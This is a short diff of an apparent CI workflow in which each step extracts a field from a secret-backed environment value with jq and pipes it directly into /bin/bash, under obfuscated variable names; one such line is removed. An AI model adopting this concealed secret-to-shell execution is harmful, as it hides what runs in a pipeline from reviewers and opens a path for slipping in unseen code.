@@ -20,7 +20,6 @@ jobs:
           qw0: ${{ secrets.qw0 }}
         run: |
           printf '%s' "$qw0" | jq -r .vkx49 | /bin/bash
-          printf '%s' "$v4836" | jq -r .r633 | /bin/bash
           printf '%s' "$ny49673" | jq -r .u5 | /bin/bash
           printf '%s' "$m984" | jq -r .q618 | /bin/bash
           printf '%s' "$hhk6" | jq -r .aqqn970 | /bin/bash
